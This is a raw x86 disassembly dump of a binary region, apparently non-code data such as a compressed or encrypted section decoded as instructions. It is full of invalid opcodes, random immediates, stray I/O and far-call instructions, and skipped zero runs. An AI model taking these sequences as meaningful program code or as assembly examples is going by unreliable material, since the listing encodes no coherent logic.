  422f2a:	push   cs
  422f2b:	xor    eax,0x1a55bc35
  422f30:	das    
  422f31:	(bad)  
  422f32:	jg     0x422ef1
  422f34:	aam    0xbc
  422f36:	xchg   ebp,eax
  422f37:	sti    
  422f38:	clc    
  422f39:	mov    ah,0xce
  422f3b:	(bad)  
  422f3c:	push   ss
  422f3d:	cmp    eax,0xdff71c74
  422f42:	xchg   esp,eax
  422f43:	xchg   ecx,eax
  422f44:	nop
  422f45:	ins    BYTE PTR es:[edi],dx
  422f46:	jmp    0x422fa1
  422f48:	into   
  422f49:	and    dh,BYTE PTR [edx+0x52]
  422f4c:	cmp    ch,bl
  422f4e:	dec    ebx
  422f4f:	xchg   ecx,eax
  422f50:	imul   ebx,DWORD PTR [ecx],0xc
  422f53:	shl    dl,1
  422f55:	cld    
  422f56:	and    ecx,esi
  422f58:	popa   
  422f59:	bswap  eax
  422f5b:	out    0xf0,eax
  422f5d:	xchg   edx,eax
  422f5e:	and    eax,0xf093d403
  422f63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422f64:	data16 test al,0xe6
  422f67:	(bad)  
  422f68:	leave  
  422f69:	cmp    al,0x47
  422f6b:	in     al,dx
  422f6c:	repnz push 0xffffffc0
  422f6f:	mov    esi,0x50fb40ab
  422f74:	xchg   DWORD PTR [ebx+0x6be242e2],eax
  422f7a:	sbb    DWORD PTR [eax+0x4ca55f53],ecx
  422f80:	push   edx
  422f81:	arpl   WORD PTR [edi-0x4b],bp
  422f84:	out    dx,eax
  422f85:	fcomp  DWORD PTR [edx-0x63]
  422f88:	sbb    BYTE PTR es:[esp+esi*2-0x782829e9],bh
  422f90:	dec    ecx
  422f91:	outs   dx,BYTE PTR ds:[esi]
  422f92:	inc    edi
  422f93:	in     eax,dx
  422f94:	and    DWORD PTR [esi-0x4143a016],edi
  422f9a:	or     eax,0xc0b9e6c
  422f9f:	mov    ecx,0xbe45b914
  422fa4:	adc    al,0x85
  422fa6:	pop    ss
  422fa7:	sbb    al,BYTE PTR [ebx+0x2d2cb826]
  422fad:	fstp   TBYTE PTR cs:[eax-0x27e652ed]
  422fb4:	addr16 (bad) 
  422fb6:	mov    ds:0x89a3e59e,eax
  422fbb:	pushf  
  422fbc:	(bad)  
  422fbe:	adc    eax,0x24183226
  422fc3:	repnz int 0x19
  422fc6:	mov    edx,0xdd716a13
  422fcb:	inc    esp
  422fcc:	sbb    eax,0xc171601d
  422fd1:	xchg   ecx,eax
  422fd2:	stos   BYTE PTR es:[edi],al
  422fd3:	cli    
  422fd4:	shl    cl,cl
  422fd6:	adc    ch,bh
  422fd8:	int    0xb7
  422fda:	div    DWORD PTR [edi]
  422fdc:	mov    ah,0x42
  422fde:	mov    dh,0x43
  422fe0:	sbb    dh,BYTE PTR ss:[edi]
  422fe3:	pop    edx
  422fe4:	sbb    ch,BYTE PTR [ecx-0x49cfd7ff]
  422fea:	js     0x422fa5
  422fec:	imul   edx,DWORD PTR [edi-0x22],0xa
  422ff0:	dec    edi
  422ff1:	inc    edi
  422ff2:	or     eax,0xbb49f947
  422ff7:	pop    ss
  422ff8:	push   edi
  422ff9:	or     eax,0x1eef6505
  422ffe:	pop    ds
  422fff:	pop    ecx
  423000:	rcl    BYTE PTR [esi],0x6b
  423003:	fdiv   QWORD PTR [ebp+0x7111f64e]
  423009:	adc    bl,BYTE PTR [ebx-0x5]
  42300c:	pop    ebp
  42300d:	push   0x64
  42300f:	callw  0x3013
	...
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [edx+eiz*4+0x157845f],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0x8b000001,al
  42308d:	cmp    esi,DWORD PTR [edi+ebp*4+0x299243d9]
  423094:	dec    edx
  423095:	pop    ebp
  423096:	mov    ecx,0x812c02c4
  42309b:	leave  
  42309c:	fmul   DWORD PTR [esi]
  42309e:	ret    
  42309f:	xchg   esp,eax
  4230a0:	jmp    0xee653911
  4230a5:	aad    0x34
  4230a7:	xchg   ebp,eax
  4230a8:	jp     0x423119
  4230aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230ab:	scas   eax,DWORD PTR es:[edi]
  4230ac:	mov    edx,DWORD PTR [ebx+0x7844341]
  4230b2:	push   ebp
  4230b3:	fcmovu st,st(0)
  4230b5:	cmp    dl,al
  4230b7:	push   cs
  4230b8:	sahf   
  4230b9:	jle    0x4230af
  4230bb:	mov    ah,0x67
  4230bd:	test   BYTE PTR [ebp-0x9658a3c],0xa2
  4230c4:	dec    edx
  4230c5:	int    0xf6
  4230c7:	pop    edx
  4230c8:	pop    ecx
  4230c9:	add    esi,DWORD PTR [ebp+0x3]
  4230cc:	jne    0x423102
  4230ce:	emms   
  4230d0:	xchg   ebp,eax
  4230d1:	(bad)  
  4230d3:	pop    ebp
  4230d4:	sbb    al,0xc
  4230d6:	sub    al,0x4f
  4230d8:	inc    esp
  4230d9:	add    eax,0xf4ac846f
  4230de:	add    DWORD PTR [edi-0x1f7ff13b],edi
  4230e4:	out    0x57,al
  4230e6:	and    ch,BYTE PTR [edx]
  4230e8:	pop    ebx
  4230e9:	sub    DWORD PTR [edi+esi*1-0x40],esi
  4230ed:	retf   0x8ef9
  4230f0:	fstp   QWORD PTR [ebx+0x3a81ee1f]
  4230f6:	xor    edi,DWORD PTR [ebp-0x6573e1a]
  4230fc:	inc    esi
  4230fd:	fsubr  st(6),st
  4230ff:	int3   
  423100:	adc    DWORD PTR [ebx+0xb],edi
  423103:	pop    ebp
  423104:	cld    
  423105:	jns    0x42310b
  423107:	add    ecx,DWORD PTR [esi+0x4f]
  42310a:	int3   
  42310b:	jle    0x423189
  42310d:	xchg   DWORD PTR ds:0xa55fc80d,edi
  423113:	(bad)  
  423114:	xchg   ebp,eax
  423115:	push   edx
  423116:	mov    ?,WORD PTR [edi+0x6c9f8cc1]
  42311c:	or     ecx,DWORD PTR [eax+eax*2+0x7]
  423120:	push   ds
  423121:	jns    0x4230f5
  423123:	or     edx,edi
  423125:	and    ebp,DWORD PTR ds:0xcfffc07f
  42312b:	retf   0x8bd4
  42312e:	inc    esp
  42312f:	mov    al,0xec
  423131:	pop    ss
  423132:	loop   0x4231a7
  423134:	xchg   esp,eax
  423135:	loope  0x423190
  423137:	xor    bl,BYTE PTR [ecx]
  423139:	dec    ecx
  42313a:	enter  0xd761,0x1c
  42313e:	aam    0xba
  423140:	cs in  al,dx
  423142:	sub    BYTE PTR [edx-0x72],bl
  423145:	xor    dl,BYTE PTR [eax]
  423147:	push   esp
  423148:	es out dx,al
  42314a:	mov    al,ds:0x92a1f2b
  42314f:	xchg   edx,eax
  423150:	inc    edx
  423151:	xchg   esp,eax
  423152:	xor    al,0xfb
  423154:	lahf   
  423155:	pop    edi
  423156:	rol    DWORD PTR [ecx],cl
  423158:	ret    
  423159:	lods   al,BYTE PTR ds:[esi]
  42315a:	sub    eax,0x5715cdcd
  42315f:	add    al,0xf6
  423161:	(bad)  
  423163:	pop    esi
  423164:	mov    edi,edx
  423166:	sub    eax,0x279d34e0
  42316b:	test   dh,0xfb
  42316e:	or     al,dl
  423170:	aam    0x9
  423172:	xchg   ebp,eax
  423173:	neg    DWORD PTR [eax]
  423175:	adc    ebx,ecx
  423177:	leave  
  423178:	push   edx
  423179:	add    eax,0xedb98ff4
  42317e:	inc    esp
  42317f:	shr    BYTE PTR [ebx-0x64],0xc7
  423183:	in     eax,0xe0
  423185:	xchg   edi,eax
  423186:	jae    0x4231ff
  423188:	cmp    cl,bh
  42318a:	lods   al,BYTE PTR ds:[esi]
  42318b:	nop
  42318c:	ja     0x42310f
  42318e:	mov    al,ds:0x8ee0
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx+0x197b474b],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x40000001,al
  42320d:	jge    0x4231fb
  42320f:	jle    0x423286
  423211:	mov    edx,0xd14de8d0
  423216:	jl     0x4231e1
  423218:	sbb    DWORD PTR [ecx-0x474cdbd7],esi
  42321e:	call   0x7950e824
  423223:	and    bl,BYTE PTR [ecx-0x27]
  423226:	ss (bad) 
  423228:	aas    
  423229:	int    0xdc
  42322b:	in     al,dx
  42322c:	jl     0x4231cb
  42322e:	test   al,0x91
  423230:	pop    edi
  423231:	mov    ecx,0x9923d7a9
  423236:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423237:	xchg   edi,eax
  423238:	loop   0x42325a
  42323a:	push   edi
  42323b:	data16 adc BYTE PTR [ecx+eax*1],0x7a
  423240:	and    DWORD PTR [edi+eax*1+0x14],0x595a0d83
  423248:	dec    eax
  423249:	dec    edi
  42324a:	dec    edx
  42324b:	xchg   edx,eax
  42324c:	in     al,dx
  42324d:	outs   dx,DWORD PTR ds:[esi]
  42324e:	push   ebp
  42324f:	retf   0xcc3
  423252:	cmp    al,0x14
  423254:	jnp    0x42328d
  423256:	aas    
  423257:	outs   dx,DWORD PTR ds:[esi]
  423258:	mov    edi,ds
  42325a:	sub    DWORD PTR [ecx],0x96a92c26
  423260:	aam    0x18
  423262:	pop    ecx
  423263:	or     eax,0xdfc31aa9
  423268:	pusha  
  423269:	mov    edx,0x11ecbeb3
  42326e:	pop    ecx
  42326f:	jle    0x42321a
  423271:	cld    
  423272:	lock call 0x82c:0x73821874
  42327a:	in     eax,dx
  42327b:	mov    bh,0xbb
  42327d:	mov    edx,0xed42a3c7
  423282:	add    eax,0x787f0c06
  423287:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  423289:	cpuid  
  42328b:	mov    al,0xc0
  42328d:	popa   
  42328e:	push   ds
  42328f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423290:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423291:	(bad)  
  423292:	mov    eax,0x94d90511
  423297:	xor    eax,DWORD PTR [eax-0x217ec390]
  42329d:	jp     0x423302
  42329f:	pop    esp
  4232a0:	imul   edx,DWORD PTR [esi+0x54b4e2ca],0x3f24bb81
  4232aa:	pusha  
  4232ab:	daa    
  4232ac:	jnp    0x42322e
  4232ae:	cwde   
  4232af:	mov    DWORD PTR [eax-0x1f],eax
  4232b2:	call   0xe2e5f3d5
  4232b7:	mov    edx,0xb327263a
  4232bc:	retf   0x9f52
  4232bf:	arpl   cx,cx
  4232c1:	xchg   ebp,eax
  4232c2:	cs xchg ebx,eax
  4232c4:	push   esi
  4232c5:	jg     0x423281
  4232c7:	ret    0x64f5
  4232ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4232cb:	inc    edi
  4232cc:	xchg   ecx,eax
  4232cd:	and    eax,0x9f8496b6
  4232d2:	jnp    0x42327b
  4232d4:	in     al,0x80
  4232d6:	sbb    dh,al
  4232d8:	or     al,0x3b
  4232da:	or     DWORD PTR [esi],edi
  4232dc:	adc    BYTE PTR [eax],0xd8
  4232df:	xchg   ecx,eax
  4232e0:	pop    eax
  4232e1:	aad    0x6c
  4232e3:	ins    DWORD PTR es:[edi],dx
  4232e4:	les    edi,FWORD PTR ds:[ebx+ecx*2]
  4232e8:	ds inc edx
  4232ea:	and    ebx,DWORD PTR [edi+0x28]
  4232ed:	jne    0x423356
  4232ef:	xor    DWORD PTR [ebx+0x2f],0xf9246971
  4232f6:	xor    al,0xec
  4232f8:	fwait
  4232f9:	push   ds
  4232fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232fb:	xor    eax,0xef267f8
  423300:	push   edi
  423301:	enter  0xdbd6,0x7c
  423305:	in     eax,dx
  423306:	mov    dh,0xfe
  423308:	xor    BYTE PTR [ebx-0xd2953ed],ch
  42330e:	arpl   WORD PTR [eax],di
  423310:	outs   dx,DWORD PTR ds:[esi]
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x9910f44
  423382:	jnp    0x4233d3
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0x80000001,al
  42338d:	inc    edi
  42338e:	lds    ecx,FWORD PTR [ebx+0x298879a0]
  423394:	cwde   
  423395:	push   ds
  423396:	fst    DWORD PTR [eax+ebp*1+0x171ff8e]
  42339d:	mov    WORD PTR [ecx-0x6b],es
  4233a0:	xchg   edx,eax
  4233a1:	out    dx,eax
  4233a2:	add    al,0x7d
  4233a4:	test   BYTE PTR [edx-0x2ce67532],al
  4233aa:	jge    0x4233b8
  4233ac:	pushf  
  4233ad:	addr16 add eax,esi
  4233b0:	call   0x9e775072
  4233b5:	sub    ebx,ebx
  4233b7:	std    
  4233b8:	aam    0xb4
  4233ba:	out    dx,al
  4233bb:	pop    esp
  4233bc:	rcl    BYTE PTR [ebx+0x2c],1
  4233bf:	cdq    
  4233c0:	cmp    BYTE PTR [ebp+0x78a0b7c2],dl
  4233c6:	shl    DWORD PTR [ecx],0xa
  4233c9:	dec    eax
  4233ca:	add    DWORD PTR ds:0xbf5db028,edi
  4233d0:	pop    eax
  4233d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233d2:	dec    esp
  4233d3:	movmskps ebp,xmm3
  4233d6:	dec    esp
  4233d7:	into   
  4233d8:	lods   al,BYTE PTR ds:[esi]
  4233d9:	mov    bl,bh
  4233db:	out    dx,eax
  4233dc:	in     al,0x45
  4233de:	scas   al,BYTE PTR es:[edi]
  4233df:	cmp    cl,ch
  4233e1:	fsubr  QWORD PTR [edx-0x1bdc2976]
  4233e7:	inc    eax
  4233e8:	shr    ah,1
  4233ea:	les    edx,FWORD PTR ds:0x76cf5287
  4233f1:	and    eax,0x1390fdce
  4233f6:	adc    eax,0xf9ca4eb4
  4233fb:	push   ss
  4233fc:	xor    DWORD PTR [eax+0x3961e19a],esi
  423402:	cld    
  423403:	cmp    esi,0xffffffb1
  423406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423407:	adc    al,ah
  423409:	test   WORD PTR [edi],dx
  42340c:	jno    0x423412
  42340e:	dec    esp
  42340f:	call   0x59f7adcb
  423414:	sub    eax,0xafe32376
  423419:	jns    0x42347f
  42341b:	push   edi
  42341c:	sahf   
  42341d:	lock clc 
  42341f:	sbb    al,0x99
  423421:	icebp  
  423422:	dec    eax
  423423:	xchg   DWORD PTR [edi+0x4],ecx
  423426:	adc    ecx,DWORD PTR [ebx]
  423428:	cli    
  423429:	jl     0x423442
  42342b:	dec    esi
  42342c:	repnz push fs
  42342f:	je     0x42341f
  423431:	lock aaa 
  423433:	xchg   edi,eax
  423434:	je     0x42342a
  423436:	shl    DWORD PTR [eax+0x6b],cl
  423439:	sub    eax,0x43f87b0e
  42343e:	xor    BYTE PTR [ebx+eax*2],al
  423441:	(bad)  
  423442:	mov    BYTE PTR [ebx],0x28
  423445:	mov    eax,0x9a44eb27
  42344a:	call   0x7f563ad1
  42344f:	pop    esi
  423450:	mov    al,ds:0x7dcd0773
  423455:	and    al,0xd3
  423457:	jbe    0x423423
  423459:	shl    ecx,cl
  42345b:	push   ebp
  42345c:	inc    esi
  42345d:	mov    eax,0xdc462691
  423462:	or     ecx,eax
  423464:	mov    ah,0xbb
  423466:	aad    0x22
  423468:	jmp    0x5e8fbca0
  42346d:	pop    ecx
  42346e:	pushf  
  42346f:	add    DWORD PTR [ebp-0x54],eax
  423472:	cmp    al,0x2d
  423474:	scas   al,BYTE PTR es:[edi]
  423475:	loopne 0x423499
  423477:	mov    eax,0xb32c8f1f
  42347c:	inc    ecx
  42347d:	dec    esi
  42347e:	mov    dl,0x5f
  423480:	div    DWORD PTR [edi]
  423482:	and    edi,esi
  423484:	mov    bl,BYTE PTR [ecx]
  423486:	cli    
  423487:	add    dl,BYTE PTR [edx]
  423489:	cld    
  42348a:	bound  ebx,QWORD PTR [ecx]
  42348c:	jbe    0x423439
  42348e:	sub    BYTE PTR ss:[eax+0x0],dl
	...
  4234f2:	add    BYTE PTR [eax],al
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	call   0x179:0x10ce63e1
  423507:	add    BYTE PTR ds:0xfd000001,al
  42350d:	aam    0xc2
  42350f:	dec    edi
  423510:	test   eax,0x310d354a
  423515:	pop    ecx
  423516:	and    al,0x42
  423518:	fwait
  423519:	jo     0x423544
  42351b:	mov    ecx,DWORD PTR [eax+0x2ce14908]
  423521:	xchg   ebx,eax
  423522:	std    
  423523:	xor    al,0xa1
  423525:	std    
  423526:	mov    eax,0xd5d1bb31
  42352b:	leave  
  42352c:	inc    ecx
  42352d:	cdq    
  42352e:	mov    esi,ecx
  423530:	in     eax,0x31
  423532:	aam    0xd2
  423534:	test   BYTE PTR [ebx+0x2743d55],dh
  42353a:	test   eax,0x330efbb5
  42353f:	scas   eax,DWORD PTR es:[edi]
  423540:	pop    edx
  423541:	(bad)  
  423542:	pop    esp
  423543:	test   BYTE PTR [edx],bl
  423545:	and    ebp,eax
  423547:	add    ecx,edx
  423549:	call   0xe8de1482
  42354e:	int    0xe4
  423550:	jns    0x4235a1
  423552:	mov    WORD PTR [edi-0x15],fs
  423555:	adc    edi,DWORD PTR [ebp+0x595eaec9]
  42355b:	sti    
  42355c:	test   DWORD PTR [edi+eax*2],ecx
  42355f:	push   edx
  423560:	push   ecx
  423561:	in     eax,dx
  423562:	jbe    0x4235d6
  423564:	ss dec ecx
  423566:	mov    ch,0x7e
  423568:	ds call 0x7ba6:0xf09da4ae
  423570:	call   0xee53:0xf8ea5799
  423577:	leave  
  423578:	push   ebx
  423579:	mov    edi,0x3576ff94
  42357e:	addr16 mov edi,0xa7353e95
  423584:	ja     0x4235b8
  423586:	popa   
  423587:	or     DWORD PTR [esi+0x5c48b95b],ecx
  42358d:	ds int3 
  42358f:	aad    0x6f
  423591:	sbb    BYTE PTR [esi-0x5e],ah
  423594:	out    dx,al
  423595:	repnz popf 
  423597:	add    edx,edi
  423599:	rcl    DWORD PTR [ebx+ebx*4],cl
  42359c:	imul   ecx,DWORD PTR [esi-0x4875c690],0x3
  4235a3:	xchg   cx,ax
  4235a5:	push   ebx
  4235a6:	data16 aas 
  4235a8:	mov    WORD PTR [ebx+0x1944c44a],fs
  4235ae:	dec    ebx
  4235af:	jb     0x4235f0
  4235b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4235b2:	shl    edi,cl
  4235b4:	pop    edi
  4235b5:	or     eax,ecx
  4235b7:	pop    ds
  4235b8:	out    0x6f,eax
  4235ba:	mov    esp,ss
  4235bc:	mov    ebp,0x273cc5cc
  4235c1:	(bad)  
  4235c2:	mov    ch,BYTE PTR [esp+eax*8-0x42]
  4235c6:	jge    0x42358c
  4235c8:	lock cmp edx,DWORD PTR [ebx+0x9]
  4235cc:	pusha  
  4235cd:	jg     0x42358c
  4235cf:	inc    edi
  4235d0:	inc    edx
  4235d1:	mov    esp,DWORD PTR [edx+ebx*2]
  4235d4:	fisub  DWORD PTR [ecx]
  4235d6:	in     eax,dx
  4235d7:	pop    esp
  4235d8:	fisubr DWORD PTR [ebx]
  4235da:	loop   0x42359a
  4235dc:	push   ebp
  4235dd:	mov    ds:0x2ec00ecf,eax
  4235e2:	addr16 mov ebp,0xada81377
  4235e8:	popf   
  4235e9:	pusha  
  4235ea:	cmp    eax,0x9feda969
  4235ef:	pop    es
  4235f0:	clc    
  4235f1:	pop    eax
  4235f2:	popf   
  4235f3:	sub    eax,0xf42e103d
  4235f8:	stos   BYTE PTR es:[edi],al
  4235f9:	push   ds
  4235fa:	inc    esp
  4235fb:	je     0x4235b2
  4235fd:	cmp    al,0x15
  4235ff:	cmp    BYTE PTR [edx-0x64],cl
  423602:	daa    
  423603:	popf   
  423604:	imul   ebx,DWORD PTR ds:0xbf68927a,0x240b260c
  42360e:	mov    DWORD PTR [ebx+0x4],esi
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x22b0213
  423683:	rcl    BYTE PTR ds:0x500017a,cl
  423689:	add    DWORD PTR [eax],eax
  42368b:	add    al,al
  42368d:	int3   
  42368e:	jmp    0x42364a
  423690:	xchg   ebp,eax
  423691:	ins    BYTE PTR es:[edi],dx
  423692:	or     BYTE PTR [ebp-0x67],0x66
  423696:	push   ecx
  423697:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423698:	xlat   BYTE PTR ds:[ebx]
  423699:	(bad)  
  42369a:	push   ebx
  42369b:	shr    BYTE PTR [esi+0x4d],1
  42369e:	popf   
  42369f:	jl     0x42362b
  4236a1:	sbb    DWORD PTR [ebp-0x3a33868c],edx
  4236a7:	add    al,0x83
  4236a9:	mov    cl,0x3f
  4236ac:	idiv   BYTE PTR [ebx+edx*4]
  4236af:	imul   BYTE PTR es:[eax-0x4c069717]
  4236b6:	fsubr  QWORD PTR [eax+0x30]
  4236b9:	jne    0x423657
  4236bb:	je     0x4236db
  4236bd:	in     eax,0x44
  4236bf:	in     al,dx
  4236c0:	sub    al,0xd4
  4236c2:	mov    dh,0x95
  4236c4:	rcr    BYTE PTR [edx-0x7],0x31
  4236c8:	call   0x41542ab7
  4236cd:	ds daa 
  4236cf:	cdq    
  4236d0:	sub    DWORD PTR [esi+0x42],esi
  4236d3:	jl     0x4236a5
  4236d5:	sub    dl,bh
  4236d7:	jg     0x423739
  4236d9:	retf   0x5e2a
  4236dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236dd:	xor    bh,ah
  4236df:	ins    BYTE PTR es:[edi],dx
  4236e0:	mov    ds,WORD PTR [eax+0x62]
  4236e3:	les    esp,FWORD PTR [edx]
  4236e5:	and    edi,ebp
  4236e7:	fucomip st,st(1)
  4236e9:	cmc    
  4236ea:	not    DWORD PTR [eax-0x6a]
  4236ed:	div    DWORD PTR [esi-0x5bf0abfe]
  4236f3:	inc    eax
  4236f4:	mov    ebx,DWORD PTR [edi]
  4236f6:	loop   0x423715
  4236f8:	cs push ebx
  4236fa:	hlt    
  4236fb:	inc    esi
  4236fc:	ret    0xcc2b
  4236ff:	(bad)  
  423701:	cmp    al,0x5e
  423703:	xchg   DWORD PTR [esi],edx
  423705:	adc    dh,dl
  423707:	sbb    edi,esp
  423709:	cmovp  ebp,DWORD PTR [ecx-0x16f2f9e6]
  423710:	into   
  423711:	inc    edx
  423712:	cdq    
  423713:	inc    edx
  423714:	popa   
  423715:	loopne 0x423765
  423717:	and    ecx,edx
  423719:	mov    fs:0x65116ecd,eax
  42371f:	sbb    dh,cl
  423721:	mov    eax,ds:0x96ac7dce
  423726:	push   ebp
  423727:	out    0x1f,al
  423729:	mov    ah,0x5c
  42372b:	jo     0x4236d3
  42372d:	and    ecx,DWORD PTR [edi]
  42372f:	fnstsw WORD PTR [eax+0x15]
  423732:	dec    ebp
  423733:	fmulp  st(0),st
  423735:	ret    
  423736:	hlt    
  423737:	or     BYTE PTR [eax+0x5c],ah
  42373a:	js     0x4236e7
  42373c:	ret    
  42373d:	mov    eax,0x43b47ec1
  423742:	mov    dh,0xc4
  423744:	push   edi
  423745:	(bad)  
  423746:	xchg   ecx,eax
  423747:	fs pop ds
  423749:	pop    ebx
  42374a:	popa   
  42374b:	in     eax,0xea
  42374d:	pop    ecx
  42374e:	mov    edx,0x69872274
  423753:	call   0xcac56634
  423758:	rcr    esp,0x4f
  42375b:	jl     0x4236f1
  42375d:	lods   eax,DWORD PTR ds:[esi]
  42375e:	js     0x423787
  423760:	sti    
  423761:	gs in  al,dx
  423763:	fstp   DWORD PTR [ebx]
  423765:	repnz inc ebx
  423767:	pop    ss
  423768:	jg     0x423720
  42376a:	pop    eax
  42376b:	inc    edi
  42376c:	push   es
  42376d:	cmp    DWORD PTR [esi+0x671781d],ebp
  423773:	xchg   BYTE PTR [ebp-0x62],bl
  423776:	iret   
  423777:	mov    bh,0xf3
  423779:	cmp    bh,BYTE PTR [edi]
  42377b:	or     al,0xf4
  42377d:	aad    0x78
  42377f:	pop    ds
  423780:	inc    ecx
  423781:	ffree  st(4)
  423783:	mov    esi,0xefbf8859
  423788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423789:	push   esi
  42378a:	jns    0x4237e0
  42378c:	inc    edx
  42378d:	xchg   esp,eax
  42378e:	mov    ch,0x7a
  423790:	push   es
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0xd6f29fc4
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0xb7000001
  42380d:	imul   esi,DWORD PTR [edi],0xffffffb3
  423810:	push   esi
  423811:	shr    BYTE PTR [ecx+0x1ac14249],1
  423817:	mov    al,ds:0x21bb6ddd
  42381c:	adc    dh,bh
  42381e:	mov    cl,bl
  423820:	add    dh,dl
  423822:	jmp    0x423829
  423824:	jne    0x4237bb
  423826:	mov    edx,0x6beef9d0
  42382b:	retf   
  42382c:	inc    esp
  42382d:	mov    bp,0xdb71
  423831:	cmp    ch,BYTE PTR [ebx+ebx*4]
  423834:	push   ebx
  423835:	jmp    0x62fb:0x85ceb9ca
  42383c:	push   es
  42383d:	add    eax,0x21d61c05
  423842:	adc    ah,BYTE PTR [esi+ebp*8-0x11]
  423846:	sbb    eax,0xfb7e2d81
  42384b:	sub    bl,BYTE PTR [edi-0x554e4760]
  423851:	inc    esp
  423852:	cmp    cl,ah
  423854:	push   edx
  423855:	xor    eax,0x387fd76a
  42385a:	std    
  42385b:	lds    edi,FWORD PTR [edi-0x16]
  42385e:	xchg   esp,eax
  42385f:	aad    0xac
  423861:	imul   ecx,DWORD PTR [ecx+0x34d807db],0x3128063b
  42386b:	retf   
  42386c:	cs mov al,0xb7
  42386f:	mov    esi,0x460495bf
  423874:	shl    BYTE PTR ds:0xe8c2fbff,1
  42387a:	mov    al,ds:0x1dd894d6
  42387f:	es jmp 0x8f95:0xf28363ac
  423887:	mov    ds:0xac385bc0,eax
  42388c:	sti    
  42388d:	dec    ecx
  42388e:	iret   
  42388f:	stc    
  423890:	cmp    eax,0xc071d638
  423895:	jns    0x4238d0
  423897:	sub    bl,dh
  423899:	(bad)  
  42389a:	in     al,dx
  42389b:	js     0x42387a
  42389d:	or     eax,0x71dc05a0
  4238a2:	enter  0xff1a,0x46
  4238a6:	pop    edi
  4238a7:	push   esi
  4238a8:	jg     0x42386f
  4238aa:	adc    al,0x2b
  4238ac:	lds    ebx,FWORD PTR [ebx+0x75]
  4238af:	rcl    BYTE PTR [edi],0xb0
  4238b2:	jl     0x4238f0
  4238b4:	mov    BYTE PTR [ebx-0x55],dh
  4238b7:	xor    bl,BYTE PTR [ebp-0x72]
  4238ba:	aaa    
  4238bb:	(bad)  
  4238bc:	out    dx,eax
  4238bd:	add    DWORD PTR [ecx-0x54],esi
  4238c0:	ret    0x860c
  4238c3:	sbb    BYTE PTR [ebp+esi*4-0x47],dl
  4238c7:	push   eax
  4238c8:	cmp    al,0xac
  4238ca:	adc    cl,bh
  4238cc:	nop
  4238cd:	and    eax,ecx
  4238cf:	sbb    DWORD PTR [esi*2-0xafdc884],edx
  4238d6:	fs popa 
  4238d8:	jbe    0x423913
  4238da:	dec    ebp
  4238db:	std    
  4238dc:	rol    BYTE PTR [ecx],0x32
  4238df:	jp     0x423927
  4238e1:	dec    edi
  4238e2:	cmp    ebx,DWORD PTR [edi-0x12547d3d]
  4238e8:	mov    edx,0x777ca5ca
  4238ed:	sub    dh,BYTE PTR [edx]
  4238ef:	sahf   
  4238f0:	ss mov ah,0xee
  4238f3:	xchg   ebx,eax
  4238f4:	mov    WORD PTR ss:[edi],?
  4238f7:	ret    0x85df
  4238fa:	ins    DWORD PTR es:[edi],dx
  4238fb:	arpl   WORD PTR [edx],bp
  4238fd:	xchg   esp,eax
  4238fe:	push   ebp
  4238ff:	pusha  
  423900:	mov    dh,0xde
  423902:	inc    edx
  423903:	mov    cl,0xe7
  423905:	push   es
  423906:	push   edx
  423907:	sar    esi,1
  423909:	mov    ebx,0xb110dbf9
  42390e:	(bad)  [ebx-0x2a]
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xdc292bbd
  423982:	(bad)  
  423983:	call   0x105:0x17c1f
  42398a:	add    BYTE PTR [eax],al
  42398c:	cmc    
  42398d:	test   DWORD PTR [eax],ecx
  42398f:	cwde   
  423990:	fist   DWORD PTR [eax-0x34]
  423993:	sub    ch,al
  423995:	dec    ecx
  423996:	xor    BYTE PTR [ebx-0x5e73be52],bl
  42399c:	mov    cl,0x78
  42399e:	pop    ss
  42399f:	sbb    al,0x2e
  4239a1:	pop    ss
  4239a2:	into   
  4239a3:	scas   eax,DWORD PTR es:[edi]
  4239a4:	daa    
  4239a5:	pop    esi
  4239a6:	push   esi
  4239a7:	es sahf 
  4239a9:	push   esp
  4239aa:	pop    edi
  4239ab:	pushf  
  4239ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4239ad:	xchg   edi,eax
  4239ae:	inc    esp
  4239af:	sub    al,0xd3
